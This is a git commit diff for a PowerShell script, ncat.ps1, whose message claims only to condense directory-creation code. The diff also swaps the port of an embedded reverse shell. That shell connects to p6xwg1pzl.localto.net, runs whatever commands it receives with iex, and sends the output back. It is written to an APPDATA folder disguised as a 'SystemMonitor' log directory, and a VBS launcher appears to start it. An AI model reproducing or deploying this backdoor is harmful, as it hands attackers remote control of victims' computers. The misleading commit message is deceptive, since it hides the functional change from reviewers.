4b2ec37b089430b9e4a49aa304407eb9f566e384
nfdownload <rootdxtrz@gmail.com>
2026-01-03 08:30:25 -0300

    Condense directory creation logic in ncat.ps1

--- ncat.ps1
+++ ncat.ps1
@@ -1,10 +1,8 @@
 $LogDir = "$env:APPDATA\SystemMonitor"
 $LogFile = "$LogDir\activity.log"
-if (-not (Test-Path $LogDir)) {
-    New-Item -ItemType Directory -Path $LogDir | Out-Null
-}
+if (-not (Test-Path $LogDir)) {New-Item -ItemType Directory -Path $LogDir | Out-Null}
 $MonitorScript = @'
-$e='SilentlyContinue';while(1){try{$c=New-Object Net.Sockets.TCPClient('p6xwg1pzl.localto.net',7450);$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$s.Flush()}}catch{Start-Sleep -s 5}}
+$e='SilentlyContinue';while(1){try{$c=New-Object Net.Sockets.TCPClient('p6xwg1pzl.localto.net',3060);$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$s.Flush()}}catch{Start-Sleep -s 5}}
 '@
 $MonitorScript | Out-File -FilePath "$LogDir\monitor.ps1" -Encoding UTF8
 $VbsLauncher = @"
